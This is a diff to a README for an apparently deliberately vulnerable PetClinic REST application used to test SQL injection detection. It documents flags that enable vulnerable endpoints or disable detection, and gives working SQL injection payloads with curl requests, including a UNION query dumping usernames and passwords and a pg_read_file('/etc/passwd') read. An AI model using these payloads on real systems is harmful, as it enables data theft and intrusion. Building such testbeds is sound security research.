@@ -51,9 +51,21 @@ POST: /vets
 
 # Deeper insert
 POST: /owners
+PUT /owners/{ownerId}
 ```
 
-To enable a vulnerability, set `vuln{x}` to `true` in `application.properties`.
+To enable a vulnerability, set `feature.unsafe` to the desired target in `application.properties`.
+One can also disable SQLi detection using `feature.sqli.detection=false`.
+This can be done by passing command line arguments, e.g.:
+```shell
+# All vulnerabilities
+java -jar petclinic.jar --feature.unsafe=all
+# Specific vulnerability
+java -jar petclinic.jar --feature.unsafe=vuln4
+```
+
+All targets have the same path prefix, i.e.:
+`PREFIX=org.springframework.samples.petclinic.repository.jdbc.`
 
 ## Endpoints with shallow depth
 These vulnerable endpoints don't have deep code execution and all detect
@@ -66,6 +78,7 @@ data from other tables.
 
 - operation: `getVet`
 - payload: `0' UNION SELECT NULL,username,password FROM users--`
+- target: `$PREFIX + JdbcVetRepositoryImpl:vulnFindById`
 
 ```shell
 curl -i -s -k -X $'GET' \
@@ -79,6 +92,7 @@ hidden data.
 
 - operation: `getSpecialty`
 - payload: `4'--`
+- target: `$PREFIX + JdbcSpecialtyRepositoryImpl:vulnFindById`
 
 ```shell
 curl -i -s -k -X $'GET' \
@@ -92,6 +106,8 @@ a new user with, e.g., leaked data.
 
 - operation: `addVet`
 - payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
+- target: `$PREFIX + JdbcVetRepositoryImpl:vulnSave`
+
 ```json
 {
   "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--",
@@ -116,12 +132,18 @@ These vulnerable endpoints deeper code path executions.
 
 [//]: # (all detect multiple rows as SQLi, so payloads work internally, but don't always return data in the HTTP response.)
 
-### Vulnerability 4: `POST /owners`
+### Vulnerability 4 & 5: `POST /owners`
 This vulnerability is the same as [Vulnerability 3](#vulnerability-3-post-vets), but with a deeper code paths.
 This is achieved by splitting `vulnSave` into `vulnStoreNewOwner` and `vulnUpdateExistingOwner`.
 
+`vuln4` is when sending a new owner.
+`vuln5` is when sending an existing owner.
+
 - operation: `addOwner`
 - payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
+- target 4: `$PREFIX + JdbcOwnerRepositoryImpl:vulnStoreNewOwner`
+- target 5: `$PREFIX + JdbcOwnerRepositoryImpl:vulnUpdateExistingOwner`
+
 ```json
 {
   "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)), 'addr', 'city', '42') RETURNING id--",
@@ -139,6 +161,13 @@ curl -i -s -k -X $'POST' \
     $'http://localhost:9966/petclinic/api/owners'
 ```
 
-### Vulnerability 5: `PUT /owners/{ownerId}`
-This vulnerability leverages the same injection as [Vulnerability 4](#vulnerability-4-post-owners), but with deeper code execution paths.
-I.e., a faulty ownerId will cause shallower execution.
+### Vulnerability 6 & 7: `PUT /owners/{ownerId}`
+This vulnerability leverages the same injection as [Vulnerability 4 & 5](#vulnerability-4--5-post-owners),
+but with deeper code execution paths. I.e., a faulty ownerId will cause shallower execution.
+
+`vuln6` is when sending a new owner.
+`vuln7` is when sending an existing owner.
+
+- operation: `updateOwner`
+- target 6: `$PREFIX + JdbcOwnerRepositoryImpl:vulnStoreNewOwner`
+- target 7: `$PREFIX + JdbcOwnerRepositoryImpl:vulnUpdateExistingOwner`
